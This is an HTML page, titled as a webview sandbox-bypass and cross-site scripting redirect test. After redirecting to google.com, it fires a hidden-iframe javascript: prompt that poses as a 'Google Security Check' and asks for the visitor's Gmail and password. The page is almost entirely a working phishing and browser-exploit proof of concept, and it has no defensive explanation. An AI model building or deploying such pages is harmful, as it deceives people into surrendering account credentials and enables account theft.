<!DOCTYPE html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, user-scalable=no">
	<title>Bypass Sandbox Webview UXSS Redirect Test</title>
	
	<style>
		iframe {
			visibility: hidden;
		}
	</style>

	<script>
		function triggerRedirect() {
			// Redirect ke domain google
			window.location.href = "https://google.com";

			// Setelah redirect, siapkan delayed prompt injection
			setTimeout(function() {
				document.getElementById("iframe").src = 
					"javascript:prompt('Google Security Check\\n\\nPlease enter your Gmail / Password to continue:', 'Email / Password')";
			}, 1500); // delay biar terkesan setelah redirect
		}
	</script>
</head>

<body>
	<center>
		<br><br>
		<h1><a href="javascript:triggerRedirect()">Click Here</a></h1>
	</center>
	<iframe id="iframe"></iframe>
</body>
</html>
